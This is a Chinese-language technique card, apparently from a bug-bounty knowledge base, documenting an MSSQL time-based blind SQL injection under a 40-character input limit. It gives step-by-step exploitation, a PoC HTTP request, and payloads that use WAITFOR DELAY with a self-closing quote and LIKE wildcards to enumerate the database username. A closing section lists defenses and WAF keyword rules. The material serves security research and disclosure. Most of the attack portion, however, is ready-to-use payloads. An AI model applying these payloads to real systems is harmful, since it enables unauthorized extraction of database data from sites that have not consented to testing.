---
id: web-generic-sqli-mssql-waitfor-quote-reuse-like-length-limit
title: MSSQL 长度受限时间盲注：WAITFOR DELAY 自带引号闭合原字符串，用 LIKE 通配符替代 SUBSTRING/ASCII
type: scenario
domain: web
path: web/generic/sqli
technique: mssql-waitfor-quote-reuse-like-blind-length-limit
aliases:
- WAITFOR DELAY 闭合单引号
- MSSQL 40 字符限制注入
- LIKE 通配符时间盲注
- if+len(user)+waitfor+delay
- 不依赖注释的 MSSQL 注入
tags:
- sqli
- mssql
- time-blind
- waitfor
- like
- length-limit
- burp
- waf-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V534
  verified_at: '2026-11-11T17:25:16+08:00'
  notes: 已对照原文全文与7张截图逐张核对：img01 ODBC 80040e14 未闭合引号确认 MSSQL 与注入点，img02 convert 尝试返回 Invalid format，img03 ProgramID=X'waitfor+delay+'0:0:2 返回 559 bytes/2,592 millis 确认延时，img06 枚举出13位数据库用户名，img04/05/07 为 H1 要求 PoC 与 Triaged 状态，与卡片原理/PoC/步骤一致。已修正一句话结论中引号闭合方向表述（原查询结尾单引号是为 WAITFOR 字符串字面量收尾）。dedup new 成立：库内 MSSQL WAITFOR 卡均为常规注释闭合加 SUBSTRING/ASCII，本卡独有自带引号闭合加 40 字符限制下 LIKE 通配符枚举；dup-scan.json 不涉及。未执行注入语句。
---

## 一句话结论

当 MSSQL 注入点位于单引号字符串内、`--`/`#` 注释被过滤或触发应用格式校验时，可以用 `X'waitfor delay '0:0:2`：payload 里 `'0:0:2` 前引号开启字符串字面量，原查询结尾的单引号正好为其收尾，不需要注释符；当参数还有 40 字符长度限制时，用 `if 条件 waitfor delay'0:0:2`（省略括号）和 `user like '前缀%'` 通配符逐位枚举，替代占字符太多的 `SUBSTRING`/`ASCII`。

## 原理

- **原查询与输入**：后端把 `ProgramID` 拼进类似 `... ProgramID='<input>' ...` 的查询。输入 `X'waitfor delay '0:0:2` 后变成：
  ```sql
  ... ProgramID='X'waitfor delay '0:0:2'
  ```
  第一个单引号闭合 `ProgramID='X'`，`waitfor delay '0:0:2` 作为独立语句执行，末尾那个单引号正好由原查询自带的收尾单引号闭合。全程不需要 `--` 或 `#`，也不会留下未闭合引号。
- **为什么注释闭合会失败**：`X'+or+1=convert(int,@@version)--`、`X'+or+1=1--` 都被应用返回 `Invalid format`，可能是后端对查询结果做了格式校验，或原查询位于存储过程/复杂 SQL 中，注释吞掉了后续必要语法。换用“第二个字符串字面量闭合”的方式保持了原语句结构。
- **40 字符限制**：实测参数最多 40 字符。`waitfor delay '0:0:2` 本身约 20 字符，只剩 20 字符；`SUBSTRING`/`ASCII` 很快超限。T-SQL 的 `IF` 条件可以省略括号（`IF condition statement`），进一步省字符；布尔判断改用 `LIKE` 通配符，例如 `if user like 'i%' waitfor delay'0:0:2`。
- **逐位枚举**：用户名 13 位时，用 `%` 分别代表前后半段，例如 `'if+user+like'is%25'waitfor+delay'0:0:2`，把 `%` 依次向右移动即可确定每一位；`%` 在 URL 中编码为 `%25`。响应时间（如约 2.5 秒）作为布尔真值。
- **边界**：`version()`、`db_name()` 这类函数名本身占字符多，加上 `WAITFOR` 后超过 40 字符，无法在该限制下取出更多信息；这是限制导致的可利用面上限，不是手法问题。

## 触发条件

- 后端为 Microsoft SQL Server（`WAITFOR DELAY` 可用），注入点位于单引号字符串内且单引号未被转义。
- 注释符被过滤/转义，或注释闭合会触发应用格式校验失败。
- 参数有较短长度限制（本例 40 字符），无法使用常规 `SUBSTRING`/`ASCII` 逐位函数。
- 攻击者可观测响应时间差异（时间盲注）。

## 利用步骤

1. 输入单引号确认报错（MSSQL ODBC 报 `Unclosed quotation mark` 等），判断注入点在字符串内。
2. 先试注释闭合 `X'+or+1=1--`；若返回 `Invalid format`/语法错误，改用 `X'waitfor delay '0:0:2` 观察是否延迟约 2 秒，确认“自带引号闭合”可行。
3. 测试长度上限：逐渐增加 payload 长度，确定被截断/拒绝的阈值（本例 40 字符）。
4. 用 `'if+len(user)=<n>+waitfor+delay'0:0:2` 判断当前数据库用户长度。
5. 用 `'if+user+like'<前缀>%25'+waitfor+delay'0:0:2` 逐位爆破；中间位置可用 `%` 同时代表前后段，如 `'if+user+like'is%25'waitfor+delay'0:0:2`。
6. 在 Burp Intruder 中把 `%` 的位置做成 payload 位置，按响应时间筛选真值，拼出完整用户名。
7. 受长度限制无法取 version/db_name 时，说明该注入点只能做有限的布尔/时间盲注，按实际可利用面上报。

## PoC

```http
GET /path?ProgramID=X'waitfor+delay+'0:0:2&method=GetECUID HTTP/1.1
Host: target
```

响应时间约 2.5 秒（正常请求明显更快），证明延时执行。

```text
'if+len(user)=13+waitfor+delay'0:0:2          # 用户名为 13 位时延时
'if+user+like'i%25'waitfor+delay'0:0:2         # 第一位为 i
'if+user+like'is%25'waitfor+delay'0:0:2        # 前两位为 is
'if+user+like'%25user'waitfor+delay'0:0:2      # 后缀匹配
```

`%` 在 URL 中编码为 `%25`；`IF` 后省略括号以节省长度。

## 变体与关联

- 关联：MSSQL `WAITFOR DELAY` 时间盲注的通用用法见 `web-generic-sqli-crm-mcc-login-workerid-time-blind`、`web-generic-sqli-jhsoft-generalxmlhttppage-appraiseid-time-sqli`。
- 关联：`LIKE` 模式串闭合/通配符位置的 payload 整形见 `web-generic-sqli-like-pattern-closed-then-reopened-quote-payload`；本卡用 `LIKE` 解决“长度不足以写 SUBSTRING/ASCII”的问题。
- 变体：无长度限制时可用 `IF(LEN(DB_NAME())>N) WAITFOR DELAY '0:0:2'` 逐位比较；有长度限制时优先 `LEN`/`LIKE`/`=` 等短函数。

## 检测与防御

- 使用参数化查询/存储过程绑定参数，禁止字符串拼接。
- WAF 拦截 `WAITFOR`、`DELAY`、`LIKE` 与异常单引号组合，并做语法级检测；不要只依赖长度限制，长度限制不是安全控制。
- 监控同一参数短时间内的大量请求与响应时间异常（约 2 秒固定延迟），结合数据库端慢查询/等待统计发现时间盲注。
- 数据库账户最小权限，限制 `WAITFOR` 等能力；错误信息统一化，避免泄露 MSSQL 报错。
